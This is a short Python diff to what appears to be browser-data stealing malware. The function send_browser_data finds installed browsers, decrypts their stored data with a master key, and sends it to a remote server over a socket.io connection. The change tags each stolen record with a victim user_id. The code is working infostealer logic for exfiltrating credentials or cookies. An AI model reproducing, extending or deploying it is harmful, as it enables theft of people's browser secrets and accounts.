@@ -31,7 +31,7 @@ def format_data(rows, type_of_data, key):
     return result
 
 
-def send_browser_data(sio):
+def send_browser_data(sio, user_id):
     available_browsers = [browser for browser, path in browsers.items() if os.path.exists(path)]
     for browser in available_browsers:
         browser_path = browsers[browser]
@@ -40,4 +40,5 @@ def send_browser_data(sio):
             for data_type_name, data_type in data_queries.items():
                 data = get_data(browser_path, "Default", master_key, data_type)
                 if data:
-                    sio.emit('browser_data_response', {'browser': browser, 'type': data_type_name, 'data': data})
+                    sio.emit('browser_data_response',
+                             {'browser': browser, 'type': data_type_name, 'data': data, 'user_id': user_id})
